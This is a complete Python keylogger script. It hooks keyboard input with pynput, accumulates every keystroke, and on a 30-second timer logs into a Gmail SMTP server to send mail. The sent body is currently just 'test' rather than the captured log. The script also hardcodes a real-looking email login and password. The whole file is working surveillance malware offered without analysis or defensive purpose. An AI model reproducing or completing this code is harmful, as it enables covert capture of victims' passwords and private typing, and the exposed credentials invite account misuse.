import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):
    global log
    log = log + str(key)
    print(log)

def send_email():
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login("semihaykemez@gmail.com", "2140040Semih")
    email_server.sendmail("semih.aykemez0@gmail.com", "semih.aykemez0@gmail.com", "test")
    email_server.quit()

# thread - threading
def thread_function():
        global log
        send_email()
        log = ""
        timer_object = threading.Timer(30, thread_function)
        timer_object.start()

send_email()
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
